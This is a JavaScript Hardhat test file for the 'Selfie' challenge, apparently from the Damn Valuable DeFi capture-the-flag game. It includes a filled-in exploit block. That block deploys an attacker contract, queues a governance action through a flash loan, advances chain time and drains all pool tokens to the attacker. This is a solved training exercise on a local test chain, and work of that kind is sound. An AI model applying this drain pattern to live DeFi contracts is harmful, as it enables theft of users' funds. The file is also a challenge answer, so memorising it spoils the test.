const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
  let deployer, attacker;

  const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
  const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory(
      'DamnValuableTokenSnapshot',
      deployer
    );
    const SimpleGovernanceFactory = await ethers.getContractFactory(
      'SimpleGovernance',
      deployer
    );
    const SelfiePoolFactory = await ethers.getContractFactory(
      'SelfiePool',
      deployer
    );

    this.token = await DamnValuableTokenSnapshotFactory.deploy(
      TOKEN_INITIAL_SUPPLY
    );
    this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
    this.pool = await SelfiePoolFactory.deploy(
      this.token.address,
      this.governance.address
    );

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.be.equal(
      TOKENS_IN_POOL
    );
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const SelfieAttackerFactory = await ethers.getContractFactory(
      'SelfieAttacker',
      attacker
    );
    const selfieAttacker = await SelfieAttackerFactory.deploy();
    await (
      await selfieAttacker
        .connect(attacker)
        .attack(this.pool.address, this.governance.address, this.token.address)
    ).wait();
    // Check if actionId is 1. If it is not, we will adjust this.
    const actionId = 1;
    const { receiver } = await this.governance.actions(actionId);
    expect(receiver).to.eq(this.pool.address);
    await ethers.provider.send('evm_increaseTime', [60 * 60 * 24 * 2]); // advance 2 days
    await (
      await selfieAttacker
        .connect(attacker)
        .finish(this.governance.address, actionId)
    ).wait();
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.be.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.be.equal('0');
  });
});
